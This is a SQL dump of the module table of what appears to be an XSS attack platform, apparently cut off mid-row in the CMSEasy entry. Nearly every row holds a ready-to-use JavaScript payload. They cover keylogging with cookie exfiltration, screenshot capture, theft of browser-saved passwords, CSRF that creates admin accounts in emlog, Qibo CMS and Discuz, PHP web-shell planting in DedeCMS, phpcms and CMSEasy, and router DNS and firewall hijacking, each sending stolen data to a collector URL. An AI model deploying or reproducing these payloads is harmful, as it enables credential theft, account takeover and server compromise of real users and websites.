
SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;


--
-- 转存表中的数据 `oc_module`
--

INSERT INTO `oc_module` (`id`, `userId`, `title`, `keys`, `setkeys`, `code`, `level`, `isOpen`, `description`, `isAudit`, `managerId`, `managerName`, `addTime`) VALUES
(34, 1, '自助xss', '[]', '["keyboard","source","cookie","title","time"]', '(function(){ss_=[],dd_=[],kk_=[],d_=document; jj_=d_.createElement(&quot;script&quot;); jj_.src=&quot;http://libs.baidu.com/jquery/1.9.1/jquery.min.js&quot;; d_.head.appendChild(jj_); if ({set.keyboard}==1) d_.body.onkeydown=d; function d(e){ t=[]; t.push(e.timeStamp); t.push(e.keyCode); t.push(e.target.nodeName); if (e.target.nodeName!=&quot;BODY&quot;)	t.push(e.target.outerHTML); else t.push(&quot;&lt;body&gt;&lt;/body&gt;&quot;); ss_.push(t);	kk_.push(String.fromCharCode(e.keyCode)); } if ({set.source}==1) {dd_.push(d_.head.outerHTML); dd_.push(d_.body.outerHTML);} if ({set.cookie}==1) {dd_.push(d_.cookie);dd_.push(d_.referrer);}if ({set.title}==1) dd_.push(d_.title);})(); function a(){setTimeout(a,{set.time}*1000);$.post(&quot;https://替换成你的域名/index.php?do=selfxss&amp;act=p&quot;,{&quot;id&quot;:&quot;{projectId}&quot;,&quot;c&quot;:ss_.join(&quot;||&quot;)+&quot;|||&quot;+kk_.join(&quot;&quot;)+&quot;|||&quot;+dd_.join(&quot;||&quot;)},function(){})};a();', 0, 1, '实现记录键盘、网页源码、cookie功能，得到的数据不存入数据库，直接定时转发到你的注册邮件，保证了隐私。设置的时候启用就输入1。时间间隔是必填项,单位是秒。', 1, 1, 'uncia', 1402253251),
(35, 1, 'HTML5截屏', '["screenshot"]', '[]', 'document.write(&quot;&lt;script src=\\&quot;http:\\/\\/vver.tk\\/html2canvas.js\\&quot;&gt;&lt;\\/script&gt;&quot;);   \r\n \r\nwindow.onload=function(){\r\n        html2canvas(document.body, {\r\n        onrendered: function(canvas) {\r\n \r\n//下面开始把抓取到的屏幕图片代码传输和接收，由于代码非常的长，只能使用post\r\nxhr=function(){\r\n        var request = false;\r\n        if(window.XMLHttpRequest){\r\n                request = new XMLHttpRequest();\r\n        }else if (window.ActiveXObject){\r\n                try{\r\n                        request = new window.ActiveXObject(&#039;Microsoft.XMLHTTP&#039;);\r\n                }catch(e){\r\n                 \r\n                }\r\n        }\r\n \r\n        return request;\r\n}();\r\n \r\nrequest = function(method,src,argv,content_type){\r\n        xhr.open(method,src,false);\r\n        if(method==&#039;POST&#039;)xhr.setRequestHeader(&#039;Content-type&#039;,content_type);\r\n        xhr.send(argv);                                         //发送POST数据\r\n        return xhr.responseText;\r\n};\r\n \r\nattack_a = function(){\r\n        var src         = &quot;https://替换成你的域名/index.php?do=api&amp;id={projectId}&quot;;                 //post接收地址\r\n        var argv_0      = &quot;&#039;&amp;screenshot=&quot;+canvas.toDataURL();    //post字段名称为screenshot\r\n        request(&quot;POST&quot;,src,argv_0,&quot;application/x-www-form-urlencoded&quot;);\r\n};\r\n \r\nattack_a();\r\n \r\n \r\n                                  }\r\n                                });\r\n                        }', 0, 1, '利用HTML5的功能进行截取客户端屏幕内容。', 1, 1, 'uncia', 1402253322),
(36, 1, '指定页面源码读取', '["mycode"]', '["filename"]', 'var u = &#039;https://替换成你的域名/index.php?do=api&amp;id={projectId}&#039;;\r\nvar cr;\r\nif (document.charset) {\r\n    cr = document.charset\r\n} else if (document.characterSet) {\r\n    cr = document.characterSet\r\n};\r\nfunction createXmlHttp() {\r\n    if (window.XMLHttpRequest) {\r\n        xmlHttp = new XMLHttpRequest()\r\n    } else {\r\n        var MSXML = new Array(&#039;MSXML2.XMLHTTP.5.0&#039;, &#039;MSXML2.XMLHTTP.4.0&#039;, &#039;MSXML2.XMLHTTP.3.0&#039;, &#039;MSXML2.XMLHTTP&#039;, &#039;Microsoft.XMLHTTP&#039;);\r\n        for (var n = 0; n &lt; MSXML.length; n++) {\r\n            try {\r\n                xmlHttp = new ActiveXObject(MSXML[n]);\r\n                break\r\n            } catch(e) {}\r\n        }\r\n    }\r\n}\r\ncreateXmlHttp();\r\nxmlHttp.onreadystatechange = writeSource;\r\nxmlHttp.open(&quot;GET&quot;, &quot;{set.filename}&quot;, true);\r\nxmlHttp.send(null); 	\r\nfunction postSource(cc) {\r\n    createXmlHttp();\r\n    url = u;\r\n    cc = &quot;mycode=&quot; + cc;\r\n    xmlHttp.open(&quot;POST&quot;, url, true);\r\n    xmlHttp.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);\r\n    xmlHttp.setRequestHeader(&quot;Content-length&quot;, cc.length);\r\n    xmlHttp.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;);\r\n    xmlHttp.send(cc)\r\n}\r\nfunction writeSource() {\r\n    if (xmlHttp.readyState == 4) {\r\n        var c = new postSource(xmlHttp.responseText)\r\n    }\r\n}', 0, 1, '获取客户端指定页面源代码', 1, 1, 'uncia', 1402253363),
(37, 1, '获取浏览器记住的明文密码', '["username","password"]', '["type1","type2","id1","id2","name1","name2"]', 'function create_body(){\r\n		document.write(&#039;&lt;body&gt;&lt;/body&gt;&#039;);\r\n	}\r\n	function create_form(user) { /*获取明文密码*/\r\n		var f = document.createElement(&quot;form&quot;);\r\n		f.style.display= &quot;none&quot;\r\n		document.getElementsByTagName(&quot;body&quot;)[0].appendChild(f);\r\n		var e1 = document.createElement(&quot;input&quot;);\r\n		e1.type = &quot;{set.type1}&quot;;\r\n		e1.name = &quot;{set.name1}&quot;;\r\n                e1.id = &quot;{set.id1}&quot;;\r\n		f.appendChild(e1);\r\n		var e = document.createElement(&quot;input&quot;);\r\n		e.name = &quot;{set.name2}&quot;;\r\n                e.type = &quot;{set.type2}&quot;;\r\n                e.id = &quot;{set.id2}&quot;;\r\n		f.appendChild(e);\r\n		\r\n		setTimeout(function () {\r\n			username = document.getElementById(&quot;{set.id1}&quot;).value;\r\n                        password = document.getElementById(&quot;{set.id2}&quot;).value;\r\n			var newimg = new Image();\r\n                       newimg.src=&quot;https://替换成你的域名/index.php?do=api&amp;id={projectId}&amp;username=&quot;+username+&quot;&amp;password=&quot;+password;\r\n		}, 2000); // 时间竞争\r\n	}\r\n\r\n	\r\n	create_form(&#039;&#039;);', 0, 1, '参考 余弦大牛的文章，写了个模块http://hi.baidu.com/zeracker/item/c2de19cbdfa013db964452cb\r\ntype id name 为要获取的表单页面 input标签属性值，测试通过 chrome firefox 360浏览器。 只要是 同域的 都可获取！\r\n比如 要获取的浏览器已记录的密码为webvul.com/admin.php 文件的 那么在\r\nwebvul.com/admin/user/list.php页面插入 也可以获取到！\r\n不懂得地方 联系我~ root#webvul.com', 1, 1, 'uncia', 1404986264),
(38, 1, 'emlog CSRF', '["username","password"]', '["user","pass","target"]', 'var gum=function(){var u={version:&quot;1140213&quot;,domain:&quot;{{domain}}&quot;,backinfo:{}};return u.e=function(code){try{return eval(code)}catch(e){return&quot;&quot;}},u.jquery=function(){return u.e(&quot;$().jquery&quot;)?1:0},u.id=function(e){return u.jquery()?$(&quot;#&quot;+e):document.getElementById(e)},u.name=function(e){return document.getElementsByTagName(e)},u.html=function(){return u.name(&quot;html&quot;)[0]||document.write(&quot;&lt;html&gt;&quot;)||u.name(&quot;html&quot;)[0]},u.rdm=function(){return Math.random()*1e5},u.bind=function(e,t,n){u.jquery()?$(e).bind(t,n):e.addEventListener?e.addEventListener(t,n,!1):e.attachEvent(&quot;on&quot;+t,n)},u.kill=function(e){u.jquery()?$(e).remove():e.parentElement.removeChild(e)},u.addom=function(e,t,n,r){!t&amp;&amp;(t=u.html());var i=document.createElement(&quot;span&quot;);i.innerHTML=e;var s=i.children[0];return n&amp;&amp;(s.style.display=&quot;none&quot;),r&amp;&amp;u.bind(s,&quot;load&quot;,r),t.appendChild(s),s},u.script=function(e,t){u.jquery()?$.getScript(e,t):(document.documentElement.appendChild(scripts=document.createElement(&quot;script&quot;)).src=e,t&amp;&amp;u.bind(scripts,&quot;load&quot;,t),u.kill(scripts))},u.ajax=function(e,t,n){var r;return t?types=&quot;POST&quot;:types=&quot;GET&quot;,u.jquery()?(r=$.ajax({type:types,url:e,data:t,success:n}),r):(window.XMLHttpRequest?r=new XMLHttpRequest:r=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;),r.open(types,e,!1),types==&quot;POST&quot;&amp;&amp;r.setRequestHeader(&quot;content-type&quot;,&quot;application/x-www-form-urlencoded&quot;),n&amp;&amp;(r.onreadystatechange=function(){this.readyState==4&amp;&amp;(this.status&gt;=200&amp;&amp;this.status&lt;=300||this.status==304)&amp;&amp;n.apply(this,arguments)}),r.send(t),r)},u.post=function(e,t,n,r){var i=u.addom(&quot;&lt;form method=&#039;POST&#039;&gt;&quot;,u.html(),!0);i.action=e;for(var s in t){var o=document.createElement(&quot;input&quot;);o.name=s,o.value=t[s],i.appendChild(o)}if(!n){var a=u.addom(&quot;&lt;iframe name=_&quot;+u.rdm()+&quot;_&gt;&quot;,u.html(),!0);i.target=a.name}r&amp;&amp;u.bind(i,&quot;submit&quot;,r),i.submit(),!n&amp;&amp;u.kill(i)&amp;setTimeout(function(){u.kill(a)},3e3)},u}();(function(){var e=&quot;{set.user}&quot;,t=&quot;{set.pass}&quot;;gum.post(unescape(&quot;{set.target}&quot;)+&quot;/admin/user.php?action=new&quot;,{login:e,password:t,password2:t,role:&quot;admin&quot;},!1),function(){(new Image).src=&quot;https://替换成你的域名/index.php?do=api&amp;id={projectId}&amp;username=&quot;+e+&quot;&amp;password=&quot;+t}()})()', 0, 1, 'emlog CSRF增加管理员\r\n通过emlog的CSRF缺陷增加管理员,创建项目时勾选即可。\r\n项目创建好以后，该js可加入任意页面。让目标管理员访问即可在后台增加管理员用户。\r\nuser是增加用户名，pass是密码，target是目标地址，格式为：http://xxxxx/,注意最后的斜杠\r\n--by phithon', 1, 1, 'uncia', 1404986331),
(39, 1, 'dedecms xss', '[]', '[]', 'varrequest =false;\r\nif(window.XMLHttpRequest){request =newXMLHttpRequest();\r\nif(request.overrideMimeType){request.overrideMimeType(&#039;text/xml&#039;);}}\r\n elseif(window.ActiveXObject){varversions =[&#039;Microsoft.XMLHTTP&#039;,&#039;MSXML.XMLHTTP&#039;,&#039;Microsoft.XMLHTTP&#039;,&#039;Msxml2.XMLHTTP.7.0&#039;,&#039;Msxml2.XMLHTTP.6.0&#039;,&#039;Msxml2.XMLHTTP.5.0&#039;,&#039;Msxml2.XMLHTTP.4.0&#039;,&#039;MSXML2.XMLHTTP.3.0&#039;,&#039;MSXML2.XMLHTTP&#039;];for(vari=0;i&lt;versions.length;i++){try{request =newActiveXObject(versions);}catch(e){}}}xmlhttp=request;functiongetFolder(url ){obj =url.split(&#039;/&#039;)returnobj[obj.length-2]}oUrl =top.location.href;u =getFolder(oUrl);add_admin();functionadd_admin(){varurl=&quot;/&quot;+u+&quot;/sys_sql_query.php&quot;;varparams =&quot;fmdo=edit&amp;backurl=&amp;activepath=%2Fdata&amp;filename=123.php&amp;str=&lt;%3Fphp+eval%28%24_POST%5Br123%5D%29%3F&gt;&amp;B1=++%E4%BF%9D+%E5%AD%98++&quot;;xmlhttp.open(&quot;POST&quot;,url,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.setRequestHeader(&quot;Content-length&quot;,params.length);xmlhttp.setRequestHeader(&quot;Connection&quot;,&quot;Keep-Alive&quot;);xmlhttp.send(params);}', 0, 1, 'DEDECMS由于编辑器过滤不严，将导致恶意脚本运行。目前只是测试过5.3到5.7版本。其他更早的版本大家就自由发挥吧。。条件有2个：开启注册开启投稿注册会员-发表文章投稿，内容如下填写\r\n', 1, 1, 'uncia', 1404986392),
(40, 1, 'phpcms2008', '[]', '[]', 'var pkav={\r\n ajax:function(){\r\n    var xmlHttp;\r\n    try{\r\n      xmlHttp=new XMLHttpRequest();\r\n   }catch (e){\r\n     try{\r\n        xmlHttp=new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);\r\n      }catch (e){\r\n       try{\r\n          xmlHttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);\r\n       }\r\n       catch (e){\r\n          return false;\r\n       }\r\n     }\r\n   }\r\n   return xmlHttp;\r\n },\r\n  req:function(url,data,method,callback){\r\n   method=(method||&quot;&quot;).toUpperCase();\r\n    method=method||&quot;GET&quot;;\r\n   data=data||&quot;&quot;;\r\n    if(url){\r\n      var a=this.ajax();\r\n      a.open(method,url,true);\r\n      if(method==&quot;POST&quot;){\r\n       a.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);\r\n     }\r\n     a.onreadystatechange=function(){\r\n        if (a.readyState==4 &amp;&amp; a.status==200)\r\n       {\r\n         if(callback){\r\n           callback(a.responseText);\r\n         }\r\n       }\r\n     };\r\n      if((typeof data)==&quot;object&quot;){\r\n        var arr=[];\r\n       for(var i in data){\r\n         arr.push(i+&quot;=&quot;+encodeURIComponent(data[i]));\r\n        }\r\n       a.send(arr.join(&quot;&amp;&quot;));\r\n      }else{\r\n        a.send(data||null);\r\n     }\r\n   }\r\n },\r\n  get:function(url,callback){\r\n   this.req(url,&quot;&quot;,&quot;GET&quot;,callback);\r\n  },\r\n  post:function(url,data,callback){\r\n   this.req(url,data,&quot;POST&quot;,callback);\r\n }\r\n};\r\nif(!window.__x){\r\npkav.post(&quot;/admin.php?mod=phpcms&amp;file=safe&amp;action=replace&amp;dosubmit=1&quot;,&quot;html=%3C%3F&amp;replace=%3C%3Fphp+%40eval%28%24_POST%5Bchr%2835%29%5D%29%3B%3F%3E%3C%3F&quot;,function(rs){});\r\npkav.get(&quot;接口地址&quot;,function(rs){});\r\n  window.__x=1;\r\n}', 0, 1, '', 2, 1, 'uncia', 1404986421),
(41, 1, 'phpcms v9', '[]', '[]', 'if(top.window.location.href.indexOf(&quot;pc_hash=&quot;)&gt;0){\r\n\r\n   var hash = top.window.location.href.substr(top.window.location.href.indexOf(&quot;pc_hash=&quot;)+8,6);\r\n\r\n}\r\nvar pkav={\r\n ajax:function(){\r\n    var xmlHttp;\r\n    try{\r\n      xmlHttp=new XMLHttpRequest();\r\n   }catch (e){\r\n     try{\r\n        xmlHttp=new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);\r\n      }catch (e){\r\n       try{\r\n          xmlHttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);\r\n       }\r\n       catch (e){\r\n          return false;\r\n       }\r\n     }\r\n   }\r\n   return xmlHttp;\r\n },\r\n  req:function(url,data,method,callback){\r\n   method=(method||&quot;&quot;).toUpperCase();\r\n    method=method||&quot;GET&quot;;\r\n   data=data||&quot;&quot;;\r\n    if(url){\r\n      var a=this.ajax();\r\n      a.open(method,url,true);\r\n      if(method==&quot;POST&quot;){\r\n       a.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);\r\n     }\r\n     a.onreadystatechange=function(){\r\n        if (a.readyState==4 &amp;&amp; a.status==200)\r\n       {\r\n         if(callback){\r\n           callback(a.responseText);\r\n         }\r\n       }\r\n     };\r\n      if((typeof data)==&quot;object&quot;){\r\n        var arr=[];\r\n       for(var i in data){\r\n         arr.push(i+&quot;=&quot;+encodeURIComponent(data[i]));\r\n        }\r\n       a.send(arr.join(&quot;&amp;&quot;));\r\n      }else{\r\n        a.send(data||null);\r\n     }\r\n   }\r\n },\r\n  get:function(url,callback){\r\n   this.req(url,&quot;&quot;,&quot;GET&quot;,callback);\r\n  },\r\n  post:function(url,data,callback){\r\n   this.req(url,data,&quot;POST&quot;,callback);\r\n }\r\n};\r\nif(!window.__x){\r\npkav.post(&quot;index.php?m=template&amp;c=file&amp;a=edit_file&amp;style=default&amp;dir=announce&amp;file=show.html&quot;,&quot;code=%7Btemplate+%27content%27%2C+%27header%27%7D%0D%0A%3C%21--main--%3E%0D%0A%3Cdiv+class%3D%22main%22%3E%0D%0A%09%3Cdiv+class%3D%22col-left%22%3E%0D%0A++++%09%3Cdiv+class%3D%22crumbs%22%3E%3Ca+href%3D%22%7BAPP_PATH%7D%22%3E%CA%D7%D2%B3%3C%2Fa%3E%3Cspan%3E+%3E+%3C%2Fspan%3E%B9%AB%B8%E6%3C%2Fdiv%3E%0D%0A++++++++%3Cdiv+id%3D%22Article%22%3E%0D%0A++++++++%09%3Ch1%3E%7B%24title%7D%3Cbr+%2F%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3C%2Fh1%3E%0D%0A%09%09%09%3Cdiv+class%3D%22content%22%3E%0D%0A%09%09%09++%7B%24content%7D%0D%0A%09%09%09%3C%2Fdiv%3E%0D%0A++++++%3C%2Fdiv%3E%0D%0A++%3C%2Fdiv%3E%0D%0A++++%3Cdiv+class%3D%22col-auto%22%3E%0D%0A++++++++%3Cdiv+class%3D%22box+pd_b0%22%3E%0D%0A%09%09%7Bpc%3Acomment+action%3D%22bang%22+cache%3D%223600%22%7D%0D%0A++++++++++++%3Cul+class%3D%22itemli%22%3E%0D%0A%09%09%09%7Bloop+%24data+%24r%7D%0D%0A++++++++++++++++%3Cli%3E%3Ca+href%3D%22%7B%24r%5Burl%5D%7D%22+target%3D%22_blank%22%3E%7Bstr_cut%28%24r%5Btitle%5D%2C+26%29%7D%3C%2Fa%3E%3C%2Fli%3E%0D%0A++++++++++++%7B%2Floop%7D%0D%0A++++++++++++%3C%2Ful%3E%0D%0A%09%09%7B%2Fpc%7D%0D%0A++++++++%3C%2Fdiv%3E%0D%0A++++%3C%2Fdiv%3E%0D%0A%3C%2Fdiv%3E%0D%0A%7Btemplate+%27content%27%2C+%27footer%27%7D%0D%0A%3Cscript+language%3Dphp%3E%24fp+%3D+%40fopen%28%22test.php%22%2C+%27a%27%29%3B%0D%0A%40fwrite%28%24fp%2C+%27%3C%27.%27%3Fphp%27.%22%5Cr%5Cn%5Cr%5Cn%22.%27%40eval%28%24_POST%5B%22chopper%22%5D%29%27.%22%5Cr%5Cn%5Cr%5Cn%3F%22.%22%3E%5Cr%5Cn%22%29%3B%0D%0A%40fclose%28%24fp%29%3B%3C%2Fscript%3E&amp;dosubmit=%CC%E1%BD%BB&amp;pc_hash=&quot;+hash,function(rs){});\r\npkav.get(&quot;index.php?m=template&amp;c=file&amp;a=visualization&amp;style=default&amp;dir=announce&amp;file=show.html&amp;pc_hash=&quot;+hash,function(rs){});\r\n  window.__x=1;\r\n}', 0, 1, 'phpcms v9 通过模板getshell ', 1, 1, 'uncia', 1404986450),
(42, 1, 'Discuz!  CSRF', '[]', '[]', 'function  getHash(){\r\n\r\n\r\nfor(var i=0; i&lt;document.links.length; i++)\r\n	{\r\n\r\n	if(document.links[i].href.indexOf(&quot;action=logout&amp;formhash=&quot;)&gt;0)\r\n	{\r\n \r\n	hash=document.links[i].href;\r\n	hash=hash.substr(hash.length-8,hash.length);\r\n	break;\r\n	}\r\n\r\n	}\r\n	\r\n	}\r\n	x = window.x || {\r\n	request: function() {\r\n		if (window.XMLHttpRequest) {\r\n			var ajax = new XMLHttpRequest()\r\n		} else if (window.ActiveXObject) {\r\n			try {\r\n				var ajax = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;)\r\n			} catch(e) {\r\n				try {\r\n					var ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;)\r\n				} catch(e) {}\r\n			}\r\n		}\r\n		return ajax\r\n	},\r\n	handle: function(ajax, callback) {\r\n		ajax.onreadystatechange = function() {\r\n			if (ajax.readyState == 4) {\r\n				if (ajax.status == 200) {\r\n					callback(ajax.responseText)\r\n				}\r\n			}\r\n		}\r\n	},\r\n     display:function(o){\r\n     if(typeof(o)==&#039;object&#039;){\r\n         var str=&#039;&#039;;\r\n         for(a in o){\r\n             \r\n             str+=a+&#039;=&#039;+o[a]+&#039;&amp;&#039;;\r\n         }\r\n         str=str.substr(0,str.length-1);\r\n         return str;\r\n     }else{\r\n         return o;\r\n     }\r\n    },\r\n	get: function(url, callback) {\r\n		ajax = x.request();\r\n		ajax.open(&#039;get&#039;, url, true);\r\n		ajax.send(null);\r\n		x.handle(ajax, callback)\r\n	},\r\n	post: function(url, content, callback) {\r\n		ajax = x.request();\r\n		ajax.open(&#039;post&#039;, url, true);\r\n		ajax.setRequestHeader(&#039;Content-Type&#039;, &#039;application/x-www-form-urlencoded&#039;);\r\n        content=x.display(content);\r\n		ajax.send(content);\r\n		x.handle(ajax, callback)\r\n	},\r\n}\r\n\r\n\r\nvar hash=&quot;&quot;;\r\ngetHash();\r\n \r\n /*发帖操作\r\nx.post(&quot;接口地址&quot;,&quot;formhash=&quot;+hash+&quot;&amp;posttime=137756647&amp;wysiwyg=1&amp;subject=%E6%96%B0%E4%BA%BA%E6%8A%A5%E9%81%93TEST&amp;message=%E6%96%B0%E4%BA%BA%E6%8A%A5%E9%81%93TEST+hacked++by+helen&amp;replycredit_extcredits=0&amp;replycredit_times=1&amp;replycredit_membertimes=1&amp;replycredit_random=100&amp;readperm=&amp;price=&amp;tags=test&amp;rushreplyfrom=&amp;rushreplyto=&amp;rewardfloor=&amp;stopfloor=&amp;creditlimit=&amp;save=&amp;adddynamic=true&amp;usesig=1&amp;allownoticeauthor=1&quot;); \r\n*/\r\n/*置顶帖子  &lt;script  src=&quot;http://w/try/1.js&quot;&gt; &lt;/script&gt;\r\nx.post(&quot;接口地址&quot;,&quot;frommodcp=&amp;formhash=&quot;+hash+&quot;&amp;fid=2&amp;redirect=&amp;listextra=page%3D1&amp;handlekey=mods&amp;moderate[]=12&amp;operations[]=stick&amp;sticklevel=3&amp;expirationstick=&amp;digestlevel=0&amp;expirationdigest=&amp;highlight_color=0&amp;highlight_style[1]=0&amp;highlight_style[2]=0&amp;highlight_style[3]=0&amp;expirationhighlight=&amp;reason=&quot;);\r\n\r\n\r\n*/', 0, 1, 'Discuz!  CSRF  复制代码，配置自定义代码\r\n参考http://yaseng.me/discuz-csrf-hijacking-admin-demo.html\r\n\r\n&lt;img src=x onerror=s=createElement(&#039;script&#039;);body.appendChild(s);s.src=&#039;http://xssan.com&#039;;&gt; ', 1, 1, 'uncia', 1404986498),
(43, 1, '路由DNS替换', '[]', '[]', '&lt;img src=http://admin:admin@192.168.1.1&gt;&lt;/img&gt;\r\n&lt;img src=http://192.168.1.1/userRpm/StatusRpm.htm?Disconnect=断线&amp;wan=0&gt;&lt;/img&gt;\r\n&lt;img src=http://192.168.1.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&amp;ip1=192.168.1.100&amp;ip2=192.168.1.199&amp;Lease=120&amp;gateway=0.0.0.0&amp;domain=&amp;dnsserver=8.8.8.8&amp;dnsserver2=0.0.0.0&amp;Save=%B1%A3+%B4%E6&gt;&lt;/img&gt;\r\n&lt;img src=http://192.168.1.1/userRpm/FireWallRpm.htm?IpRule=0&amp;MacRule=0&amp;Save=%B1%A3+%B4%E&gt;&lt;/img&gt;\r\n&lt;img\r\nsrc=&quot;http://192.168.1.254/userRpm/ManageControlRpm.htm?port=80&amp;ip=255.255.255.255&amp;Save=%C8%B7+%B6%A8&quot;\r\nwidth=&quot;1&quot; height=&quot;1&quot; border=&quot;0&quot; /&gt;', 0, 1, '路由DNS替换', 1, 1, 'uncia', 1408393782),
(44, 1, '弹框测试', '[]', '[]', 'alert(&quot;xss&quot;)', 0, 1, 'javascript里弹出框&quot;xss&quot;', 1, 1, 'uncia', 1409967490),
(45, 1, '齐博cms加管理', '[]', '[]', 'var pkav={\r\n ajax:function(){\r\n    var xmlHttp;\r\n    try{\r\n      xmlHttp=new XMLHttpRequest();\r\n   }catch (e){\r\n     try{\r\n        xmlHttp=new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);\r\n      }catch (e){\r\n       try{\r\n          xmlHttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);\r\n       }\r\n       catch (e){\r\n          return false;\r\n       }\r\n     }\r\n   }\r\n   return xmlHttp;\r\n },\r\n  req:function(url,data,method,callback){\r\n   method=(method||&quot;&quot;).toUpperCase();\r\n    method=method||&quot;GET&quot;;\r\n   data=data||&quot;&quot;;\r\n    if(url){\r\n      var a=this.ajax();\r\n      a.open(method,url,true);\r\n      if(method==&quot;POST&quot;){\r\n       a.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);\r\n     }\r\n     a.onreadystatechange=function(){\r\n        if (a.readyState==4 &amp;&amp; a.status==200)\r\n       {\r\n         if(callback){\r\n           callback(a.responseText);\r\n         }\r\n       }\r\n     };\r\n      if((typeof data)==&quot;object&quot;){\r\n        var arr=[];\r\n       for(var i in data){\r\n         arr.push(i+&quot;=&quot;+encodeURIComponent(data[i]));\r\n        }\r\n       a.send(arr.join(&quot;&amp;&quot;));\r\n      }else{\r\n        a.send(data||null);\r\n     }\r\n   }\r\n },\r\n  get:function(url,callback){\r\n   this.req(url,&quot;&quot;,&quot;GET&quot;,callback);\r\n  },\r\n  post:function(url,data,callback){\r\n   this.req(url,data,&quot;POST&quot;,callback);\r\n }\r\n};\r\nif(!window.__x){\r\npkav.post(&quot;/admin/index.php?lfj=member&amp;action=addmember&quot;,&quot;postdb%5Busername%5D=kakahuadmin&amp;postdb%5Bpasswd%5D=kakahuadmin&amp;postdb%5Bpasswd2%5D=kakahuadmin&amp;postdb%5Bgroupid%5D=3&amp;postdb%5Bemail%5D=kakahuadmin%40qq.com&amp;Submit=%CC%E1%BD%BB&quot;,function(rs){});\r\npkav.get(&quot;接口地址&quot;,function(rs){});\r\n  window.__x=1;\r\n}', 0, 1, '齐博cms加管理', 1, 1, 'uncia', 1404986539),
(46, 1, 'cmseasy getshell', '[]', '[]', 'function sendrequest(){\r\n var m=[&quot;Msxml2.XMLHTTP&quot;, &quot;Microsoft.XMLHTTP&quot;]\r\n if (window.ActiveXObject){\r\n  for (var i=0; i&lt;m.length; i++){\r\n   try{\r\n    return new ActiveXObject(m[i])\r\n   }\r\n   catch(e){}\r\n  }\r\n }else if (window.XMLHttpRequest) {\r\n return new XMLHttpRequest()\r\n }else{\r\n	return false\r\n }\r\n\r\n  \r\n}\r\nvar request=new sendrequest();\r\nvar data= &quot;sid=footer_html&amp;slen=2661&amp;scontent=%3C!--+%E9%A1%B5%E5%BA%95+--%3E%0A%3Cdiv+id%3D%22footer%22+class%3D%22mt10%22%3E%0A%3Cdiv+class%3D%22box%22%3E%0A%3Cdiv+class%3D%22footer%22%3E%0A%3C!--+%E5%8F%8B%E6%83%85logo+--%3E%0A%3Cdiv+class%3D%22links%22%3E%0A%7Bif+%24topid%3D%3D0%7D%0A%7Bloop+friendlink(&#039;image&#039;%2C0%2C20)+%24flink%7D%0A%3Ca+href%3D%22%7B%24flink%5Burl%5D%7D%22+title%3D%22%7B%24flink%5Bname%5D%7D%22%3E%3Cimg+src%3D%22%7B%24flink%5Blogo%5D%7D%22+%2F%3E%3C%2Fa%3E%0A%7B%2Floop%7D%0A%7Belse%7D%0A%7Blang(hotkeys)%7D%EF%BC%9A+%7Bgethotsearch(10)%7D%0A%7B%2Fif%7D%0A%3C%2Fdiv%3E%0A%3C!--+%E9%A1%B5%E5%BA%95%E5%AF%BC%E8%88%AA+--%3E%0A%3Cdiv+class%3D%22about%22%3E%0A%3Cimg+src%3D%22%7B%24skin_path%7D%2Fimages%2Ffoot_logo.gif%22+%2F%3E%0A%7Btag_%E7%BD%91%E7%AB%99%E9%A1%B5%E5%BA%95%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC%E7%AD%89%E8%AF%B4%E6%98%8E%7D%0A%7Bif+get(&#039;opguestadd&#039;)%3D%3D&#039;1&#039;%7D%3Ca+rel%3D%22nofollow%22+href%3D%22%7B%24base_url%7D%2F%3Fg%3D1%22%3E%7Blang(opguestadd)%7D%3C%2Fa%3E+%7C%7B%2Fif%7D%0A%3Ca+href%3D%22%23%22%3ETOP%3C%2Fa%3E%0A%3C%2Fdiv%3E%0A%0A%3Cdiv+class%3D%22copyright%22%3E%0A%0A%3C!--+%E9%A1%B5%E5%BA%95%E8%AF%B4%E6%98%8E+--%3E%0A%7Bget(site_right)%7D+%3Ca+title%3D%22%7Bget(&#039;sitename&#039;)%7D%22+href%3D%22%7B%24base_url%7D%2F%22%3E%7Bget(&#039;sitename&#039;)%7D%3C%2Fa%3E+All+Rights+Reserved.%C2%A0%C2%A0+%7Bif+get(&#039;site_login&#039;)%3D%3D&#039;1&#039;%7D%7Blogin_js()%7D%7B%2Fif%7D%0A%3Cdiv+class%3D%22blank5%22%3E%3C%2Fdiv%3E%0A%7Bgetcnzzcount()%7D%C2%A0%C2%A0Powered+by+%3Ca+href%3D%22http%3A%2F%2Fwww.cmseasy.cn%22+title%3D%22CmsEasy%E4%BC%81%E4%B8%9A%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F%22+target%3D%22_blank%22%3ECmsEasy%3C%2Fa%3E%C2%A0%C2%A0%3Ca+rel%3D%22nofollow%22+href%3D%22http%3A%2F%2Fwww.miibeian.gov.cn%2F%22+rel%3D%22nofollow%22+target%3D%22_blank%22%3E%7Bget(&#039;site_icp&#039;)%7D%3C%2Fa%3E%0A%3C%2Fdiv%3E%0A%3Cdiv+class%3D%22clear%22%3E%3C%2Fdiv%3E%0A%3C%2Fdiv%3E%0A%7Bif+%24topid%3D%3D0%7D%3C!--+%E7%83%AD%E9%97%A8%E5%85%B3%E9%94%AE%